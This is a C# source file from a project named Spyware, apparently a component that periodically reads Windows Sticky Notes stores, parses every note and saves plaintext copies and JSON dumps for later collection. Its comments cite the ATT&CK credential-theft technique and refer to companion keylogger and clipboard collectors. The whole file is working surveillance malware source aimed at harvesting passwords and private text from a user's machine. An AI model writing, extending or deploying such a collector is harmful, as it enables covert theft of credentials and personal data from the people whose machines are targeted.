using System.Text.Json;
using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Scheduling;
using Spyware.Storage;

namespace Spyware.Collectors.Notes;

/// <summary>
/// T1555.001 Credentials from Password Stores: Keychain… aplicado a Sticky Notes, que en
/// la práctica es donde mucha gente guarda claves y datos a la vista. El agente SOLO LEE:
/// copia el almacén a su carpeta temporal y trabaja sobre la copia.
/// </summary>
public sealed class StickyNotesProvider : ICollector
{
    private const int SeenHashLimit = 5_000;

    private static readonly JsonSerializerOptions DumpOptions = new() { WriteIndented = true };

    private readonly AgentPaths _paths;
    private readonly LocalEventRepository _repository;
    private readonly SpoolManager _spool;
    private readonly NotesSection _config;
    private readonly ILog _log;
    private readonly HashSet<string> _seenHashes = new(StringComparer.OrdinalIgnoreCase);
    private readonly object _gate = new();

    private PeriodicTask? _task;

    public string Name => "notes";

    public int TotalCollected { get; private set; }
    public int LastRunCollected { get; private set; }

    public StickyNotesProvider(AgentPaths paths, LocalEventRepository repository, SpoolManager spool,
                               NotesSection config, ILog log)
    {
        _paths = paths;
        _repository = repository;
        _spool = spool;
        _config = config;
        _log = log;
    }

    public void Start()
    {
        if (!_config.Enabled)
        {
            _log.Info("Collector de Sticky Notes deshabilitado.");
            return;
        }

        _task = new PeriodicTask(
            Name,
            () => CollectAll(),
            TimeSpan.FromMinutes(Math.Max(1, _config.IntervalMinutes)),
            _config.JitterSeconds,
            _log);

        _task.Start(runImmediately: true);
    }

    public void Stop()
    {
        _task?.Dispose();
        _task = null;
    }

    public int CollectAll()
    {
        IReadOnlyList<NoteStoreHandle> stores = StickyNotesSource.Discover(_config, _log);

        if (stores.Count == 0)
        {
            _log.Debug("Sticky Notes: sin almacenes para este usuario.");
            return 0;
        }

        string tempDirectory = Path.Combine(_paths.TempDirectory, $"sticky-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDirectory);

        var collected = new List<NoteEvent>();

        try
        {
            foreach (NoteStoreHandle store in stores)
                collected.AddRange(ReadStore(store, tempDirectory));

            List<NoteEvent> fresh = FilterUnchanged(collected);

            if (fresh.Count > 0)
                TotalCollected += _repository.InsertNotes(fresh);

            if (_config.SaveTextCopy)
                SaveTextCopies(fresh);

            if (_config.WriteDumpFile && collected.Any(note => note.Text is not null))
                WriteDump(collected);

            LastRunCollected = fresh.Count;

            _log.Info($"Notas leídas: {collected.Count}, nuevas o cambiadas: {fresh.Count}.");
            return fresh.Count;
        }
        finally
        {
            try { Directory.Delete(tempDirectory, recursive: true); }
            catch (Exception ex) { _log.Debug("Limpieza de temp: " + ex.Message); }
        }
    }

    /// <summary>Una nota por almacén con su estado; la lectura y la interpretación van aparte.</summary>
    private IReadOnlyList<NoteEvent> ReadStore(NoteStoreHandle store, string tempDirectory)
    {
        if (!store.Exists)
        {
            _log.Debug($"{store.DisplayName}: sin archivo de datos en {store.FilePath}.");

            return [new NoteEvent
            {
                Source = Source(store.Kind),
                Store = store.StoreName,
                Status = NoteStatus.NotFound,
                FailureReason = "archivo no encontrado"
            }];
        }

        string copy = Path.Combine(tempDirectory, store.StoreName);

        if (!SnapshotCopy.TryCopy(store.FilePath, copy, _log, out string status, out string? reason))
        {
            _log.Warn($"{store.DisplayName}: {reason ?? status}.");

            return [new NoteEvent
            {
                Source = Source(store.Kind),
                Store = store.StoreName,
                Status = status,
                FailureReason = reason
            }];
        }

        try
        {
            return store.IsDatabase
                ? PlumDatabaseReader.Read(copy, store.StoreName, _config, _log)
                : SntFileReader.Read(copy, store.StoreName, _config, _log);
        }
        catch (Exception ex)
        {
            _log.Error($"No se pudo leer {store.DisplayName}.", ex);

            return [new NoteEvent
            {
                Source = Source(store.Kind),
                Store = store.StoreName,
                Status = NoteStatus.Corrupted,
                FailureReason = ex.GetType().Name
            }];
        }
    }

    /// <summary>
    /// Sticky Notes no avisa de cambios: cada ciclo vuelve a ver las mismas notas. Se
    /// registra solo lo nuevo o lo editado (cambia el hash), como hace el portapapeles
    /// con su hash por formato.
    /// </summary>
    private List<NoteEvent> FilterUnchanged(IReadOnlyList<NoteEvent> notes)
    {
        var fresh = new List<NoteEvent>();

        lock (_gate)
        {
            foreach (NoteEvent note in notes)
            {
                // Los fallos de lectura siempre se registran: no tienen hash que comparar.
                string key = note.Hash is null
                    ? $"{note.Source}|{note.Store}|{note.Status}|{note.FailureReason}"
                    : note.Hash;

                if (_config.SkipUnchanged && note.Hash is not null && _seenHashes.Contains(key))
                    continue;

                if (_seenHashes.Count < SeenHashLimit)
                    _seenHashes.Add(key);

                fresh.Add(note);
            }
        }

        return fresh;
    }

    /// <summary>
    /// Copia en claro del texto de cada nota nueva o cambiada (`storage\notes\note_<UTC>_<id>.txt`):
    /// el mismo criterio que la copia del portapapeles y la del keylog, para poder leer el
    /// contenido sin abrir la base de datos.
    /// </summary>
    private void SaveTextCopies(IReadOnlyList<NoteEvent> notes)
    {
        DateTime now = DateTime.UtcNow;

        foreach (NoteEvent note in notes)
        {
            if (note.Text is null) continue;

            try
            {
                string path = _spool.SaveNote(note.Text, now, note.NoteId);
                _log.Debug($"Copia de la nota {note.NoteId} en {path}.");
            }
            catch (Exception ex)
            {
                _log.Warn($"La copia de la nota {note.NoteId} no se escribió: {ex.Message}");
            }
        }
    }

    private void WriteDump(IReadOnlyList<NoteEvent> notes)
    {
        try
        {
            string json = JsonSerializer.Serialize(
                notes.Select(note => new
                {
                    note.Source,
                    note.Store,
                    note.NoteId,
                    note.Text,
                    note.Format,
                    note.Status,
                    note.FailureReason,
                    note.Deleted,
                    note.CreatedAt,
                    note.UpdatedAt
                }),
                DumpOptions);

            _spool.SaveNotesDump(json, DateTime.UtcNow);
        }
        catch (Exception ex)
        {
            _log.Warn("El volcado de notas no se escribió: " + ex.Message);
        }
    }

    private static string Source(NoteStoreKind kind) =>
        kind == NoteStoreKind.PlumDatabase ? "sticky" : "sticky_legacy";
}
